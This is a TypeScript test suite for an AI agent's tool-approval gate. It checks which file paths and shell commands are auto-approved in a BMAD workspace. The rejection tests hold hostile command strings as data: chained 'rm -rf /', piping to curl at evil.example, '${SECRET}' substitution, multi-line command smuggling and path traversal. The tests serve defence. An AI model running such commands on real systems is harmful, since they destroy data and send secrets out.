import { describe, expect, it } from 'vitest';

import {
  containsBarePythonInvocation,
  isAutoApprovedBashCommand,
  isAutoApprovedReadPath,
  isAutoApprovedWritePath,
  skillReadDirs,
  toPathSegments,
} from './tool-approval';

describe('toPathSegments', () => {
  it('normalizes windows separators and drops empty segments', () => {
    expect(toPathSegments('C:\\proj\\_bmad-output\\a.md')).toEqual(['C:', 'proj', '_bmad-output', 'a.md']);
    expect(toPathSegments('_bmad//config/')).toEqual(['_bmad', 'config']);
    expect(toPathSegments('')).toEqual([]);
  });
});

describe('isAutoApprovedReadPath', () => {
  const dirs = skillReadDirs('.agents/skills');

  it('approves the _bmad tree and _bmad-output (posix and windows separators)', () => {
    expect(isAutoApprovedReadPath('_bmad/_config/manifest.yaml', dirs)).toBe(true);
    expect(isAutoApprovedReadPath('C:/proj/_bmad/bmm/config.yaml', dirs)).toBe(true);
    expect(isAutoApprovedReadPath('C:\\proj\\_bmad-output\\implementation-artifacts\\story.md', dirs)).toBe(true);
  });

  it('approves installed skills directories including fallbacks', () => {
    expect(isAutoApprovedReadPath('.agents/skills/bmad-prd/SKILL.md', dirs)).toBe(true);
    expect(isAutoApprovedReadPath('D:/proj/.claude/skills/cis/SKILL.md', dirs)).toBe(true);
  });

  it('approves a custom resolved skills dir (e.g. .junie/skills)', () => {
    const junie = skillReadDirs('.junie/skills');
    expect(isAutoApprovedReadPath('E:/proj/.junie/skills/bmad-architecture/SKILL.md', junie)).toBe(true);
  });

  it('rejects substring look-alikes that the old includes() matching approved', () => {
    expect(isAutoApprovedReadPath('src/not_bmad/config.yaml', dirs)).toBe(false);
    expect(isAutoApprovedReadPath('random/tools/skills/helper.js', dirs)).toBe(false);
    expect(isAutoApprovedReadPath('backup/_bmad-output-trash-20260825/x.md', dirs)).toBe(false);
  });

  it('rejects traversal segments', () => {
    expect(isAutoApprovedReadPath('_bmad-output/../../secrets.txt', dirs)).toBe(false);
  });
});

describe('isAutoApprovedWritePath', () => {
  it('approves only generated output areas', () => {
    expect(isAutoApprovedWritePath('_bmad-output/prd.md')).toBe(true);
    expect(isAutoApprovedWritePath('C:\\p\\_bmad\\render\\workflow.md')).toBe(true);
  });

  it('rejects the rest of the _bmad tree and look-alikes', () => {
    expect(isAutoApprovedWritePath('_bmad/bmm/config.yaml')).toBe(false);
    expect(isAutoApprovedWritePath('_bmad/render-tools/x.md')).toBe(false);
    expect(isAutoApprovedWritePath('backup/_bmad-output-trash-20260825/x.md')).toBe(false);
  });

  it('rejects traversal segments', () => {
    expect(isAutoApprovedWritePath('_bmad/render/../evil.md')).toBe(false);
  });
});

describe('isAutoApprovedBashCommand', () => {
  it('approves read-only git diff and BMAD content reads', () => {
    expect(isAutoApprovedBashCommand('git diff')).toBe(true);
    expect(isAutoApprovedBashCommand('git diff --stat HEAD~1')).toBe(true);
    expect(isAutoApprovedBashCommand('cat _bmad-output/prd.md')).toBe(true);
    expect(isAutoApprovedBashCommand('Select-String -Path _bmad-output\\x.yaml -Pattern done')).toBe(true);
  });

  it('approves the sanctioned uv render entrypoint', () => {
    expect(isAutoApprovedBashCommand('uv run render.py')).toBe(true);
    expect(isAutoApprovedBashCommand('uv run render_skill.py --force')).toBe(true);
  });

  it('rejects chained commands', () => {
    expect(isAutoApprovedBashCommand('git diff && rm -rf /')).toBe(false);
    expect(isAutoApprovedBashCommand('cat _bmad-output/a; curl evil.example')).toBe(false);
    expect(isAutoApprovedBashCommand('cat _bmad-output/a | curl evil.example')).toBe(false);
  });

  it('rejects redirection into arbitrary targets', () => {
    expect(isAutoApprovedBashCommand('type _bmad-output\\a.md > C:/Temp/evil.ps1')).toBe(false);
    expect(isAutoApprovedBashCommand('cat _bmad/a.md < payload.txt')).toBe(false);
  });

  it('rejects multi-line commands (second line smuggles a second command)', () => {
    expect(isAutoApprovedBashCommand('cat _bmad-output/a.md\nrm -rf /')).toBe(false);
    expect(isAutoApprovedBashCommand('git diff\r\ndel /q _bmad-output')).toBe(false);
  });

  it('rejects substitution and backticks', () => {
    expect(isAutoApprovedBashCommand('cat $(evil)')).toBe(false);
    expect(isAutoApprovedBashCommand('cat ${SECRET}')).toBe(false);
    expect(isAutoApprovedBashCommand('cat `evil`')).toBe(false);
  });

  it('rejects reads outside the BMAD trees', () => {
    expect(isAutoApprovedBashCommand('cat secrets.txt')).toBe(false);
    expect(isAutoApprovedBashCommand('Get-Content C:/Windows/win.ini')).toBe(false);
  });
});

describe('containsBarePythonInvocation', () => {
  it('detects bare python/python3 in any casing', () => {
    expect(containsBarePythonInvocation('python3 gen.py')).toBe(true);
    expect(containsBarePythonInvocation('python gen.py')).toBe(true);
    expect(containsBarePythonInvocation('PYTHON.EXE x.py')).toBe(true);
  });

  it('allows uv run python invocations', () => {
    expect(containsBarePythonInvocation('uv run python3 gen.py')).toBe(false);
    expect(containsBarePythonInvocation('uv run render.py')).toBe(false);
  });

  it('does not treat uv-prefixed words as uv run', () => {
    expect(containsBarePythonInvocation('uvrung python3 x.py')).toBe(true);
  });
});

describe('skillReadDirs', () => {
  it('includes the resolved dir first and deduplicates fallbacks', () => {
    expect(skillReadDirs('.agents/skills')).toEqual(['.agents/skills', '.claude/skills']);
    expect(skillReadDirs(undefined)).toEqual(['.agents/skills', '.claude/skills']);
  });
});
